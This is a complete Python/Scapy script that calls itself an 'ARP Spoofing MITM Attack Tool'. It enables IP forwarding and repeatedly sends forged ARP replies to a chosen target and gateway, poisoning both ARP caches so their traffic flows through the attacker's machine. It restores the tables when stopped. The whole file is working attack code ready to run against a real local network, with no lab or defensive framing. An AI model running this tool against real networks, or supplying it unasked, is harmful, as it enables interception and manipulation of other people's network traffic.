#!/usr/bin/env python3
import os
import time
import argparse
from scapy.all import ARP, Ether, sendp, getmacbyip, conf, srp

def enable_ip_forwarding():
    """Enable IP forwarding on the attacking machine"""
    print("[*] Enabling IP forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null")

def disable_ip_forwarding():
    """Disable IP forwarding on the attacking machine"""
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null")

def get_mac(ip, interface):
    """Get MAC address for a given IP with error handling"""
    try:
        conf.verb = 0  # Disable scapy verbosity
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface, retry=2, verbose=False)
        for _, rcv in ans:
            return rcv[Ether].src
        print(f"[-] Could not resolve MAC for {ip}")
        return None
    except Exception as e:
        print(f"[-] Error getting MAC for {ip}: {str(e)}")
        return None

def spoof(target_ip, spoof_ip, interface):
    """Send ARP packets to poison the target's ARP cache"""
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        return False
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(Ether(dst=target_mac)/packet, iface=interface, verbose=False)
    print(f"[+] Sent spoofed ARP to {target_ip} claiming to be {spoof_ip}")
    return True

def restore(target_ip, source_ip, interface):
    """Restore the ARP tables of the target machines"""
    target_mac = get_mac(target_ip, interface)
    source_mac = get_mac(source_ip, interface)
    
    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                     psrc=source_ip, hwsrc=source_mac)
        sendp(Ether(dst=target_mac)/packet, iface=interface, count=5, verbose=False)
        print(f"[+] Restored ARP table for {target_ip}")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing MITM Attack Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    args = parser.parse_args()

    try:
        enable_ip_forwarding()
        print(f"[*] Starting ARP spoofing between {args.target} and {args.gateway}")
        print("[*] Press Ctrl+C to stop and restore ARP tables")
        
        sent_packets = 0
        while True:
            try:
                if spoof(args.target, args.gateway, args.interface):
                    sent_packets += 1
                if spoof(args.gateway, args.target, args.interface):
                    sent_packets += 1
                
                print(f"\r[*] Packets sent: {sent_packets}", end="")
                time.sleep(2)
            except KeyboardInterrupt:
                print("\n[*] Detected CTRL+C, restoring ARP tables...")
                restore(args.target, args.gateway, args.interface)
                restore(args.gateway, args.target, args.interface)
                disable_ip_forwarding()
                print("[*] Attack stopped. ARP tables restored.")
                break
    except Exception as e:
        print(f"[-] Critical error: {str(e)}")
        disable_ip_forwarding()

if __name__ == "__main__":
    main()
